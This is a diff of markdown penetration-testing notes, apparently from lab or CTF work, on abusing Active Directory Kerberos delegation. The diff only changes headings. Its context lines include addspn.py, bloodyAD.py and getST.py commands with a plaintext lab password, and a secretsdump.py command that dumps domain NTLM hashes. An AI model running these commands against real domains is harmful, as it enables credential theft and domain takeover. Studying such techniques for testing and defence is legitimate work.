@@ -13,7 +13,7 @@ seo:
   canonical: "" # custom canonical URL (optional)
   robots: "" # custom robot tags (optional)
 ---
-
+## Privesc
 ####  SeEnableDelegationPrivilege
 
 
@@ -48,7 +48,7 @@ addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/UwU.delegate.vl' 
 bloodyAD.py -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host 'DC1.delegate.vl' add uac 'UwU$' -f TRUSTED_FOR_DELEGATION
 ```
 
-#### Unconstrained Delegation
+## Unconstrained Delegation
 #ADS_UF_TRUSTED_FOR_DELEGATION
 - Enumerate Uncontrained Delegation :
 ```sh
@@ -87,7 +87,7 @@ export KRB5CCNAME=`pwd`/'krbtgt.ccache
 secretsdump.py -k DC1.delegate.vl -just-dc-ntlm
 ```
 
-#### Constrained Delegation
+## Constrained Delegation
 
 #TRUSTED_TO_AUTH_FOR_DELEGATION
 
@@ -122,7 +122,7 @@ getST.py tengu.vl/gMSA01$ -spn 'MSSQLSvc/SQL.tengu.vl:1433' -impersonate 'T1_M.W
 ```
 
 
-#### RBCD( Resource-based constrained ) 
+## RBCD( Resource-based constrained ) 
 
 - With linux 
 ```sh
